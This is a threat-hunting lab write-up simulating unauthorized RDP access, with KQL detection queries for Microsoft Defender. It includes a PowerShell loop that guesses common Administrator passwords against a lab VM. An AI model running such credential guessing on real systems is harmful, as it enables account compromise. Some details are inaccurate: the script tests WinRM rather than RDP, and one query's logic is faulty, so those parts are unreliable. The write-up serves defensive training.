# Threat Event (Unauthorized RDP Access)
**Unauthorized Remote Desktop Protocol (RDP) Access**

## Steps the "Bad Actor" Took to Create Logs and IoCs:
1. **Reconnaissance**: The bad actor scans for open RDP ports (TCP 3389) on the target network.
   - Utilizes Nmap to find exposed services.
2. **Brute Force**: The bad actor attempts to authenticate using brute force.
   - Use a PowerShell script to simulate a BruteForce attempt.
``` $username = "Administrator"  # Change to a valid username
$passwords = @("Password123!", "P@ssw0rd!", "Admin123", "123456")  # List of passwords to try
$victimIP = "10.0.0.26"  # Replace with the private IP of `thscenariovm`

foreach ($password in $passwords) {
    try {
        $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
        $credential = New-Object System.Management.Automation.PSCredential ($username, $securePassword)
        Test-WSMan -ComputerName $victimIP -Credential $credential -ErrorAction Stop
        Write-Host "Login successful with password: $password"
        break
    } catch {
        Write-Host "Login failed with password: $password"
    }
}
```
3. **Successful Login**: The attacker successfully logs into the machine over RDP.
   - Logs show the source IP address used for RDP access.
4. **Command Execution**: The attacker executes commands or malicious scripts once logged in (e.g., downloading malware, lateral movement).

---

## Tables Used to Detect IoCs:

| **Parameter**       | **Description**                                                              |
|---------------------|------------------------------------------------------------------------------|
| **Name**| DeviceLogonEvents                                                            |
| **Info**| https://learn.microsoft.com/en-us/defender-xdr/advanced-hunting-devicelogonevents-table |
| **Purpose**| Used to detect successful RDP logins, including login source IP and username. |

| **Parameter**       | **Description**                                                              |
|---------------------|------------------------------------------------------------------------------|
| **Name**| DeviceNetworkEvents                                                           |
| **Info**| https://learn.microsoft.com/en-us/defender-xdr/advanced-hunting-devicenetworkevents-table |
| **Purpose**| Used to detect network activity over port 3389 and connections from suspicious IP addresses. |

| **Parameter**       | **Description**                                                              |
|---------------------|------------------------------------------------------------------------------|
| **Name**| DeviceProcessEvents                                                           |
| **Info**| https://learn.microsoft.com/en-us/defender-xdr/advanced-hunting-deviceprocessevents-table |
| **Purpose**| Used to detect RDP session creation or any commands executed remotely. |

---

## Related Queries:
```kql
// Detecting RDP login attempts
DeviceLogonEvents
| where DeviceName == "thscenariovm"
| where ActionType in ("LogonFailed", "LogonSuccess")  // Focus on logon attempts
| project Timestamp, DeviceName, AccountName, LogonType, ActionType, RemoteIP

// Detect RDP traffic on port 3389 from suspicious IPs
DeviceNetworkEvents
| where DeviceName == "thscenariovm"
| project Timestamp, DeviceName, RemoteIP, RemotePort, InitiatingProcessFileName

// Detect suspicious processes spawned after RDP login
DeviceProcessEvents
| where ProcessCommandLine contains "cmd.exe" or "powershell.exe"
| where InitiatingProcessFileName == "mstsc.exe" // mstsc.exe is the RDP client
| project Timestamp, DeviceName, AccountName, ProcessCommandLine, InitiatingProcessFileName
```
---

## Created By:
- **Author Name**: James Harrington
- **Author Contact**: https://www.linkedin.com/in/Goodk47/
- **Date**: January 24, 2024

## Validated By:
- **Reviewer Name**: 
- **Reviewer Contact**: 
- **Validation Date**: 

---

## Additional Notes:
- **None**
